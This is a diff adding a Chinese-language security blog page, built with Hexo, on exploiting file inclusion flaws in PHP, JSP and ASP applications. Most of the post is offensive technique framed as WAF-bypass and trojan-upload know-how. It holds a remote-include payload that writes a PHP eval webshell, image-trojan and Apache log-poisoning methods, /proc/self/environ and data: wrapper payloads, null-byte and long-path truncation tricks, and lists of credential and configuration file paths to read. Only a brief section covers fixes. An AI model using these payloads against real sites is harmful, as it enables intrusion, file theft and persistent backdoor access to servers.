@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="文件包含漏洞(绕过姿势)　　文件包含漏洞是渗透测试过程中用得比较多的一个漏洞，主要用来绕过waf上传木马文件。今日在逛Tools论坛时，发现了一种新型的文件包含姿势，在此记录分享，并附上一些文件包含漏洞的基础利用姿势。 特殊姿势　　利用phar://协议特性可以在渗透过程中帮我们绕过一些waf检测，phar:// 数据流包装器自 PHP 5.3.0 起开始有效，貌似可以绕过安全狗。 利用过程新建s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/06/17/文件包含漏洞/index.html">
+<meta property="og:site_name" content="= =！">
+<meta property="og:description" content="文件包含漏洞(绕过姿势)　　文件包含漏洞是渗透测试过程中用得比较多的一个漏洞，主要用来绕过waf上传木马文件。今日在逛Tools论坛时，发现了一种新型的文件包含姿势，在此记录分享，并附上一些文件包含漏洞的基础利用姿势。 特殊姿势　　利用phar://协议特性可以在渗透过程中帮我们绕过一些waf检测，phar:// 数据流包装器自 PHP 5.3.0 起开始有效，貌似可以绕过安全狗。 利用过程新建s">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://thief.one/upload_image/20170410/1.png">
+<meta property="og:image" content="https://thief.one/upload_image/20170410/2.png">
+<meta property="og:image" content="https://thief.one/upload_image/20170410/3.png">
+<meta property="og:image" content="https://thief.one/upload_image/20170410/4.png">
+<meta property="og:updated_time" content="2019-06-17T01:54:56.294Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="文件包含漏洞">
+<meta name="twitter:description" content="文件包含漏洞(绕过姿势)　　文件包含漏洞是渗透测试过程中用得比较多的一个漏洞，主要用来绕过waf上传木马文件。今日在逛Tools论坛时，发现了一种新型的文件包含姿势，在此记录分享，并附上一些文件包含漏洞的基础利用姿势。 特殊姿势　　利用phar://协议特性可以在渗透过程中帮我们绕过一些waf检测，phar:// 数据流包装器自 PHP 5.3.0 起开始有效，貌似可以绕过安全狗。 利用过程新建s">
+<meta name="twitter:image" content="https://thief.one/upload_image/20170410/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/06/17/文件包含漏洞/">
+
+
+
+
+
+  <title>文件包含漏洞 | = =！</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">= =！</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/17/文件包含漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="61T">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="= =！">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">文件包含漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-17T09:53:39+08:00">
+                2019-06-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="文件包含漏洞-绕过姿势"><a href="#文件包含漏洞-绕过姿势" class="headerlink" title="文件包含漏洞(绕过姿势)"></a>文件包含漏洞(绕过姿势)</h1><p>　　文件包含漏洞是渗透测试过程中用得比较多的一个漏洞，主要用来绕过waf上传木马文件。今日在逛Tools论坛时，发现了一种新型的文件包含姿势，在此记录分享，并附上一些文件包含漏洞的基础利用姿势。</p>
+<h3 id="特殊姿势"><a href="#特殊姿势" class="headerlink" title="特殊姿势"></a>特殊姿势</h3><p>　　利用phar://协议特性可以在渗透过程中帮我们绕过一些waf检测，phar:// 数据流包装器自 PHP 5.3.0 起开始有效，貌似可以绕过安全狗。</p>
+<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>新建shell.php代码内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;phar://test.rar/test.txt&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>新建test.txt里的内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>　　压缩test.txt文件，可以重命名压缩文件为zip,phar,rar等格式，之后访问shell.php文件后，会出现phpinfo内容。</p>
+<h4 id="亲测有效"><a href="#亲测有效" class="headerlink" title="亲测有效"></a>亲测有效</h4><p>在实验环境下，在test目录下新建shell.php，test.txt，并将test.txt打包成test.zip。<br><a href="https://thief.one/upload_image/20170410/1.png" target="_blank" rel="noopener"><img src="https://thief.one/upload_image/20170410/1.png" alt="img"></a><br>shell.php内容如下：<br><a href="https://thief.one/upload_image/20170410/2.png" target="_blank" rel="noopener"><img src="https://thief.one/upload_image/20170410/2.png" alt="img"></a><br>test.txt内容如下：<br><a href="https://thief.one/upload_image/20170410/3.png" target="_blank" rel="noopener"><img src="https://thief.one/upload_image/20170410/3.png" alt="img"></a><br>访问shell.php:<br><a href="https://thief.one/upload_image/20170410/4.png" target="_blank" rel="noopener"><img src="https://thief.one/upload_image/20170410/4.png" alt="img"></a></p>
+<p>参考：<a href="http://bbs.pediy.com/thread-216191.htm" target="_blank" rel="noopener">http://bbs.pediy.com/thread-216191.htm</a></p>
+<h3 id="php文件包含漏洞"><a href="#php文件包含漏洞" class="headerlink" title="php文件包含漏洞"></a>php文件包含漏洞</h3><p>PHP中的文件包含分为本地包含与远程包含，导致文件包含的函数如下：</p>
+<ul>
+<li>include()</li>
+<li>include_once()</li>
+<li>require()</li>
+<li>require_once()</li>
+<li>fopen()</li>
+<li>readfile()<br>……</li>
+</ul>
+<h4 id="本地包含漏洞（LFI）"><a href="#本地包含漏洞（LFI）" class="headerlink" title="本地包含漏洞（LFI）"></a>本地包含漏洞（LFI）</h4><p>新建一个phpinfo.txt，然后新建一个shell.php，写入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    Include(&quot;phpinfo.txt&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>　　访问shell.php会输出phpinfo页面内容，无论将扩展名改为什么，都将以php代码执行。如果文件不是符合php规则的（即没有写&lt;?php ?&gt;等），则通过include可以直接输出源码。</p>
+<h4 id="远程包含漏洞"><a href="#远程包含漏洞" class="headerlink" title="远程包含漏洞"></a>远程包含漏洞</h4><p>前提：需要开启allow_url_fopen，默认关闭。<br>新建php.txt:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   echo &quot;hello world&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>新建index.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    Include($_GET[&apos;page&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>访问<em><a href="http://www.xxxx.com/page=http://www.xxxx.com/php.txt" target="_blank" rel="noopener">http://www.xxxx.com/page=http://www.xxxx.com/php.txt</a></em>执行结果将输出hello world。</p>
+<h4 id="文件包含利用"><a href="#文件包含利用" class="headerlink" title="文件包含利用"></a>文件包含利用</h4><h5 id="读取敏感信息"><a href="#读取敏感信息" class="headerlink" title="读取敏感信息"></a>读取敏感信息</h5><p>如：<a href="http://www.xxx.com/index.php?page=/etc/passwd" target="_blank" rel="noopener">http://www.xxx.com/index.php?page=/etc/passwd</a><br>Windows:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini</span><br><span class="line">c:\windows\systems32\inetsrv\MetaBase.xml</span><br><span class="line">c:\windows\repair\sam</span><br><span class="line">c:\windows\php.ini             php配置文件</span><br><span class="line">c:\windows\my.ini               mysql配置文件</span><br></pre></td></tr></table></figure>
+<p>LINUX:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/usr/local/app/apache2/conf/http.conf</span><br><span class="line">/usr/local/app/php5/lib/php.ini          PHP相关设置</span><br><span class="line">/etc/httpd/conf/http.conf                    apache配置文件</span><br><span class="line">/etc/my.cnf                                              mysql配置文件</span><br></pre></td></tr></table></figure>
+<h5 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h5><p>test.txt文件，可以保存在远程服务器上，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[nmask]);?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure>
+<p>　　如果目标网站存在远程包含漏洞，则可以通过访问：<em><a href="http://www.xxx1.com/index.php?page=http://www.xx2.com/test.txt" target="_blank" rel="noopener">http://www.xxx1.com/index.php?page=http://www.xx2.com/test.txt</a></em>则会在服务器根目录下生产一个shell.php内容为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   eval($_POST[nmask]);?&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h5><p>如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传<br>上传一个图片木马a.jpg，内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[tzc]);?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure>
+<p>访问URL：<em><a href="http://www.xxx.com/index.php?page=./a.jpg" target="_blank" rel="noopener">http://www.xxx.com/index.php?page=./a.jpg</a></em>在本地生成shell.php。</p>
+<h5 id="本地包含配合apache日志拿shell"><a href="#本地包含配合apache日志拿shell" class="headerlink" title="本地包含配合apache日志拿shell"></a>本地包含配合apache日志拿shell</h5><p>　　apache日志分为access.log与error.log，当我们请求一个url地址时，便会记录在access.log中，但如果访问一个不存在的页面，便会将这个页面写入access.log中。如访问URL:<em><a href="http://www.xxx.com/" target="_blank" rel="noopener">http://www.xxx.com/</a>&lt;?php eval([$_POST]);?&gt;</em>则会将一句话写入到access.log中，但是一般来说，写入到access.log文件中的一句话是被编码的，所以需要抓包绕过，而且利用此漏洞需要知道access.log的地址，不然便没有。</p>
+<h5 id="利用-proc-self-environ进行包含"><a href="#利用-proc-self-environ进行包含" class="headerlink" title="利用/proc/self/environ进行包含"></a>利用/proc/self/environ进行包含</h5><p>如：<a href="http://www.test.com/view.php?page=../../../../proc/self/environ" target="_blank" rel="noopener">http://www.test.com/view.php?page=../../../../proc/self/environ</a><br>这是web进程运行时的环境变量，其中有些参数是可以被用户控制的，最常见做法就是在User-Agent中插入一句话。</p>
+<h5 id="利用php协议进行包含"><a href="#利用php协议进行包含" class="headerlink" title="利用php协议进行包含"></a>利用php协议进行包含</h5><ul>
+<li>data:　　php5.2以后版本</li>
+<li>php://input　　需要开启allow_url_include</li>
+</ul>
+<p>poc:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;%00</span><br></pre></td></tr></table></figure>
+<h5 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h5><p>有些开发者为了防止本地包含漏洞，会编写一下代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    Include  $_GET[&apos;page&apos;].&quot;.php&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>（一）00截断包含<br>新建1.jpg:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[tzc]);?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure>
+<p>　　这样的话比如上传一个1.jpg图片码，则访问<em><a href="http://www.xxx.com/1.jpg" target="_blank" rel="noopener">http://www.xxx.com/1.jpg</a></em>时，访问的是1.jgp.php，以为没有这个文件所以报错。这是，可以尝试访问<em><a href="http://www.xxx.com/1.jpg%00" target="_blank" rel="noopener">http://www.xxx.com/1.jpg%00</a></em></p>
+<p>（二）使用长目录截断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">././././././././././././././etc/passwd</span><br><span class="line">或者</span><br><span class="line">////////////////////////////etc/passwd</span><br><span class="line">或者</span><br><span class="line">../a/etc/passwd/../a/etc/passwd/../a/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>在windows下目录最大长度为256字节，linux下为4096字节，其后面超出部分被丢弃。</p>
+<h4 id="文件包含漏洞修复"><a href="#文件包含漏洞修复" class="headerlink" title="文件包含漏洞修复"></a>文件包含漏洞修复</h4><p>开启open_basedir函数，将其设置为指定目录，则只有该目录的文件允许被访问。<br>关闭allow_url_include函数，防止远程文件包含。</p>
+<h3 id="jsp文件包含漏洞"><a href="#jsp文件包含漏洞" class="headerlink" title="jsp文件包含漏洞"></a>jsp文件包含漏洞</h3><h4 id="include"><a href="#include" class="headerlink" title="include"></a>include</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ include file=&quot;head.jsp&quot;%&gt;</span><br><span class="line">&lt;%@ include file=&quot;body.jsp&quot;%&gt;</span><br><span class="line">&lt;%@ include file=&quot;tail.jsp&quot;%&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="jsp-include"><a href="#jsp-include" class="headerlink" title="jsp:include"></a>jsp:include</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:include page=&quot;head.jsp&quot;/&gt;</span><br><span class="line">&lt;jsp:include page=&quot;body.jsp&quot;/&gt;   </span><br><span class="line">&lt;jsp:include page=&quot;tail.jsp”/&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="采用JSTL"><a href="#采用JSTL" class="headerlink" title="采用JSTL"></a>采用JSTL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>(1)include指令在转换时插入“Header.jsp”的源代码，而标准动作在运行时插入“Header.jsp”的响应。元素允许你包含动态文件和静态，而include说明标签仅仅是把一个文件内容当成静态追加到主文件中去。<br>(2)采用前两种方式，只能包含当前web应用的界面，不过c:import可以包含容器之外的内容。</p>
+<h3 id="asp文件包含漏洞"><a href="#asp文件包含漏洞" class="headerlink" title="asp文件包含漏洞"></a>asp文件包含漏洞</h3><p>asp貌似无法包含远程文件（iis安全设置），只能包含本地文件，语法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file=&quot;1.asp&quot; --&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="aspx文件包含漏洞"><a href="#aspx文件包含漏洞" class="headerlink" title="aspx文件包含漏洞"></a>aspx文件包含漏洞</h3><p>aspx文件包含与asp一样，语法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file=&quot;top.aspx&quot; --&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="http://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/" target="_blank" rel="noopener">文件上传漏洞(绕过姿势)</a></p>
+<p><strong>本文标题:</strong><a href="https://thief.one/2017/04/10/2/" target="_blank" rel="noopener">文件包含漏洞(绕过姿势)</a></p>
+<p><a href="https://thief.one/2017/04/10/1/" target="_blank" rel="noopener">https://thief.one/2017/04/10/1/</a>)</p>
+<p><a href="https://thief.one/2017/04/12/1/" target="_blank" rel="noopener">phpcms漏洞 </a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/15/微信DLL劫持反弹shell复现/" rel="next" title="微信DLL劫持反弹shell复现">
+                <i class="fa fa-chevron-left"></i> 微信DLL劫持反弹shell复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/15/i春秋DMZ大型靶场-内网拓展/" rel="prev" title="i春秋DMZ大型靶场(内网拓展)">
+                i春秋DMZ大型靶场(内网拓展) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">61T</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件包含漏洞-绕过姿势"><span class="nav-number">1.</span> <span class="nav-text">文件包含漏洞(绕过姿势)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#特殊姿势"><span class="nav-number">1.0.1.</span> <span class="nav-text">特殊姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用过程"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#亲测有效"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">亲测有效</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php文件包含漏洞"><span class="nav-number">1.0.2.</span> <span class="nav-text">php文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#本地包含漏洞（LFI）"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">本地包含漏洞（LFI）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程包含漏洞"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">远程包含漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件包含利用"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">文件包含利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#读取敏感信息"><span class="nav-number">1.0.2.3.1.</span> <span class="nav-text">读取敏感信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#远程包含shell"><span class="nav-number">1.0.2.3.2.</span> <span class="nav-text">远程包含shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#本地包含配合文件上传"><span class="nav-number">1.0.2.3.3.</span> <span class="nav-text">本地包含配合文件上传</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#本地包含配合apache日志拿shell"><span class="nav-number">1.0.2.3.4.</span> <span class="nav-text">本地包含配合apache日志拿shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用-proc-self-environ进行包含"><span class="nav-number">1.0.2.3.5.</span> <span class="nav-text">利用/proc/self/environ进行包含</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用php协议进行包含"><span class="nav-number">1.0.2.3.6.</span> <span class="nav-text">利用php协议进行包含</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#截断包含"><span class="nav-number">1.0.2.3.7.</span> <span class="nav-text">截断包含</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件包含漏洞修复"><span class="nav-number">1.0.2.4.</span> <span class="nav-text">文件包含漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jsp文件包含漏洞"><span class="nav-number">1.0.3.</span> <span class="nav-text">jsp文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#include"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">include</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#jsp-include"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">jsp:include</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#采用JSTL"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">采用JSTL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#说明"><span class="nav-number">1.0.3.4.</span> <span class="nav-text">说明</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#asp文件包含漏洞"><span class="nav-number">1.0.4.</span> <span class="nav-text">asp文件包含漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#aspx文件包含漏洞"><span class="nav-number">1.0.5.</span> <span class="nav-text">aspx文件包含漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#传送门"><span class="nav-number">1.0.6.</span> <span class="nav-text">传送门</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">61T</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
